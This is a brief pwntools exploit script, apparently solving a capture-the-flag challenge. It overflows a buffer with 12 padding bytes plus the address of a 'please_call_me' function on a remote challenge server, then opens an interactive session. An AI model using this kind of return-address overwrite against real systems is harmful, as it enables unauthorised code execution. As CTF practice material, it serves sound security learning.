from pwn import *

r = remote("challs.ctf.cafe", 8888)
exe = ELF("./chall")
# r = process(exe.path)
# gdb.attach(r, gdbscript='''
#            b*main+35
#            c
#            ''')
# input()
payload = b"aaaaaaaaaaaa" + p64(exe.sym["please_call_me"] + 1 )
r.sendline(payload)
r.interactive()
